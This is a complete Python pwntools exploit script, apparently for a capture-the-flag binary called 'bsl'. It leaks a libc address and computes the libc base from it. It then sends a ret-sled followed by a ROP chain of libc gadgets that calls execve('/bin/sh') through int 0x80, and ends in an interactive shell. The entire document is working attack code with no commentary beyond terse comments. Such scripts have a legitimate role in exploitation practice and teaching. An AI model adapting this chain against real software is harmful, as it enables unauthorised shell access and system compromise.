from pwn import *

# context.log_level = 'debug'

p = process('./bsl')
libc = ELF('libc.so.6')

gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

def getPayload():
    xoreax = gadget("xor eax, eax; ret")
    log.info(repr(xoreax))
    inceax = gadget("inc eax; ret")
    log.info(repr(inceax))
    popebx = gadget("pop ebx; ret")
    log.info(repr(popebx))
    popecxedx = gadget("pop ecx; pop edx; ret")
    log.info(repr(popecxedx))
    intx = gadget("int 0x80")


    payload = xoreax # Set eax to 0xb
    payload += inceax * constants.SYS_execve

    # Set ebx to /bin/sh
    payload += popebx + p32(libc.search("/bin/sh").next())

    # 0 out ecx, edx
    payload += popecxedx + p32(0) * 2

    # Call int 0x80
    payload += intx
    return payload

p.recvuntil('(y/n)')
p.sendline('y')
p.recvuntil('is: ')
leak = int(p.recv(10), 16)
print hex(leak)
libc.address = leak - libc.symbols['_IO_puts']
log.info(libc.address)
p.recvuntil('(y/n)')
# p.recvline()
p.sendline('y')
p.recvline()
p.sendline('0') #favourite number
p.recvuntil('fact!')
retChain = "1"+gadget("ret")*(0x490/4)
payload = getPayload()
print(repr(payload))
p.sendline(retChain+payload)
p.recvuntil('(y/n)')
p.sendline('y')
p.sendline('1') #least favourite
print p.recvline()
pause()
p.sendline('\xff'*0xd0)
# stack_pivot = gadget('add esp, 0xc; pop ebx; pop esi');
p.interactive()

